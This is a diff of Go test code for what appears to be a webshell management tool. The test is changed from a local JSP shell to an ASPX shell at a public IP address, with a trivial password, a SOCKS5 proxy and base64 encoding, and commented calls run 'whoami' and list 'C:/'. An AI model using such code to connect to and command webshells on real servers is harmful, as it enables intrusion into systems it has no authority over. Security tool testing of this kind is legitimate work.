@@ -219,7 +219,7 @@ function encrypt($data){
 		t.Error(err)
 		return
 	}
-	t.Logf("%v", (ping))
+	t.Logf("%v", ping)
 	//cmd, err := bx.CommandExec("whoami")
 	////ping, err := bx.listFile("C:/")
 	//if err != nil {
@@ -547,22 +547,24 @@ func TestYakShellPhp(t *testing.T) {
 }
 
 func TestYakShellJsp(t *testing.T) {
-	url := "http://localhost:8080/tomcat_war_exploded/el.jsp"
+	//url := "http://localhost:8080/tomcat_war_exploded/el.jsp"
+	url := "http://47.120.44.219:8087/shell.aspx"
 	manager, err := NewYakShellManager(url,
 		SetYakShellTool(),
-		SetPass("1231231212312312"),
+		SetPass("1"),
 		SetBase64(),
-		SetShellScript(ypb.ShellScript_JSP.String()),
+		SetShellScript(ypb.ShellScript_ASPX.String()),
 		SetProxy("socks5://127.0.0.1:8083"),
 		SetTimeout(10),
-		SetBase64AesDec(),
+		SetBase64Dec(),
+		//SetBase64AesDec(),
 	)
 	if err != nil {
 		panic(err)
 	}
-	ping, err := manager.BasicInfo()
+	ping, err := manager.Ping()
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(string(ping))
+	fmt.Println(ping)
 }
